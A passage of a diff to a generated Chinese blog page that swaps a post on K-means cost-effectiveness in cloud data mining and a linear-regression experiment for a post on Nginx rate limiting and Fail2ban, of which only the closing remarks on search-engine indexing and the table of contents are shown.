-<p>个人认为这是因为K-means对初始聚类中心选择敏感，随机选择初始中心点显然是不合理的，应该选择距离数据点最远的k个点。</p>
-<h3 id="结论与展望"><a href="#结论与展望" class="headerlink" title="结论与展望"></a>结论与展望</h3><p>实验结果证实了大数据挖掘在云计算中的成本效益的重要性。在实验中，K-means算法仅占总计算时间的0.32%-46.17%，就可以达到99%的准确度。这可以节省下99.68％的费用成本，仅仅损失了1%的准确率。未来可以通过其他内部准确度评价指标和其他数据挖掘算法，进一步探索云计算下大数据挖掘的成本效益问题。</p>
-<h3 id="多变量线性回归下的实验"><a href="#多变量线性回归下的实验" class="headerlink" title="多变量线性回归下的实验"></a>多变量线性回归下的实验</h3><p>下面是自己用线性回归做的一个很简单的实验验证</p>
-<h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>采用梯度下降法进行线性回归</p>
-<h3 id="评价指标-1"><a href="#评价指标-1" class="headerlink" title="评价指标"></a>评价指标</h3><p>采用均方误差（mean-square error, MSE)</p>
-<script type="math/tex; mode=display">J(\theta_0) = \frac{ 1 }{ 2m } \displaystyle \sum_{ i = 1 }^{ m } (\hat{ y }^{(i)} - y^{(i)})^2 = \frac{ 1 }{ 2m } \displaystyle \sum_{ i = 1 }^{ m } (h_\theta(x^{(i)}) - y^{(i)})^2</script><p>其中:</p>
-<p>m：训练样本的个数；</p>
-<p>hθ(x)：用参数θ和x预测出来的y值</p>
-<p>y：原训练样本中的y值</p>
-<h3 id="数据集-1"><a href="#数据集-1" class="headerlink" title="数据集"></a>数据集</h3><p>采用的数据集格式如下图所示，共有47个样本(面积单位为平方英尺，价格单位为美元):</p>
-<p><img src="/images/云计算下大数据挖掘的成本效益-以K-means算法为例/dataset.png" alt=""></p>
-<center>图5:(from Linear Regression: Housing Prices by Andrew Ng)</center>
-
-
-<h3 id="实验结果-1"><a href="#实验结果-1" class="headerlink" title="实验结果"></a>实验结果</h3><p><img src="/images/云计算下大数据挖掘的成本效益-以K-means算法为例/LP1.PNG" alt="Image"></p>
-<center>图6:房屋数据集下进行线性回归的准确率与耗时</center>
-
-
-
-<p><img src="/images/云计算下大数据挖掘的成本效益-以K-means算法为例/result.PNG" alt="Image"></p>
-<center>图7:不同迭代次数下的准确率与耗时</center>
-
-
-
-<p>总结如下表所示，可以看出，在这个线性回归的案例中，程序用了总计算时间的13.10%和29.32%，达到了0.99与0.999的准确率，最后为了提高0.0001的准确率，耗费了93.50%的总时间。这个简单的实验也有力印证了在线性回归的最优化中同样存在着长尾效应。  </p>
-<p><img src="/images/云计算下大数据挖掘的成本效益-以K-means算法为例/percent.PNG" alt="Image"></p>
-<center>表3:线性回归耗时百分比</center>
-
+<h2 id="额外彩蛋"><a href="#额外彩蛋" class="headerlink" title="额外彩蛋"></a>额外彩蛋</h2><p>偶然的一次搜索，发现自己网站已经被 Google 爬了，hhhh<br><img src="/images/Nginx流量控制配合Fail2ban抵御流量攻击/google.png" alt=""></p>
+<p>但是百度仍然没有收录</p>
+<p><img src="/images/Nginx流量控制配合Fail2ban抵御流量攻击/baidu.png" alt=""></p>
 
       
     </div>
@@ -566,7 +486,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/数据挖掘/" rel="tag"><i class="fa fa-tag"></i> 数据挖掘</a>
+            <a href="/tags/Nginx/" rel="tag"><i class="fa fa-tag"></i> Nginx</a>
           
         </div>
       
@@ -579,8 +499,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/05/05/基于OpenCV与Dlib的杠铃轨迹追踪器/" rel="next" title="基于OpenCV与Dlib的杠铃轨迹追踪器">
-                <i class="fa fa-chevron-left"></i> 基于OpenCV与Dlib的杠铃轨迹追踪器
+              <a href="/2018/11/17/决策树算法之ID3-C4.5/" rel="next" title="决策树算法之ID3/C4.5">
+                <i class="fa fa-chevron-left"></i> 决策树算法之ID3/C4.5
               </a>
             
           </div>
@@ -588,10 +508,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/06/11/书漂网-一个基于Flask开发的图书交换网站/" rel="prev" title="书漂网：一个基于Flask开发的书籍交换网站">
-                书漂网：一个基于Flask开发的书籍交换网站 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -740,7 +656,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#原论文"><span class="nav-number">1.</span> <span class="nav-text">原论文</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#摘要"><span class="nav-number">2.</span> <span class="nav-text">摘要</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#相关工作"><span class="nav-number">3.</span> <span class="nav-text">相关工作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#算法"><span class="nav-number">4.</span> <span class="nav-text">算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#评价指标"><span class="nav-number">5.</span> <span class="nav-text">评价指标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#付费模式"><span class="nav-number">6.</span> <span class="nav-text">付费模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据集"><span class="nav-number">7.</span> <span class="nav-text">数据集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结果"><span class="nav-number">8.</span> <span class="nav-text">实验结果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#长尾效应"><span class="nav-number">9.</span> <span class="nav-text">长尾效应</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结论与展望"><span class="nav-number">10.</span> <span class="nav-text">结论与展望</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#多变量线性回归下的实验"><span class="nav-number">11.</span> <span class="nav-text">多变量线性回归下的实验</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#算法-1"><span class="nav-number">12.</span> <span class="nav-text">算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#评价指标-1"><span class="nav-number">13.</span> <span class="nav-text">评价指标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据集-1"><span class="nav-number">14.</span> <span class="nav-text">数据集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结果-1"><span class="nav-number">15.</span> <span class="nav-text">实验结果</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nginx-log-file"><span class="nav-number">2.</span> <span class="nav-text">Nginx log file</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nginx-实现流量控制与手动禁-IP"><span class="nav-number">3.</span> <span class="nav-text">Nginx 实现流量控制与手动禁 IP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#流量控制"><span class="nav-number">3.1.</span> <span class="nav-text">流量控制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#手动禁-IP"><span class="nav-number">3.2.</span> <span class="nav-text">手动禁 IP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fail2ban-实现动态黑名单与邮件通知"><span class="nav-number">4.</span> <span class="nav-text">Fail2ban 实现动态黑名单与邮件通知</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#动态黑名单"><span class="nav-number">4.1.</span> <span class="nav-text">动态黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-mail-发送邮件通知"><span class="nav-number">4.2.</span> <span class="nav-text">使用 mail 发送邮件通知</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他命令"><span class="nav-number">5.</span> <span class="nav-text">其他命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#额外彩蛋"><span class="nav-number">6.</span> <span class="nav-text">额外彩蛋</span></a></li></ol></div>
             
 
           </div>
@@ -1411,7 +1327,7 @@
         showTime(Counter);
       }
     });
-  </script>
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
 
 
@@ -1423,26 +1339,6 @@
   
 
   
-  
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
-
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
 
 
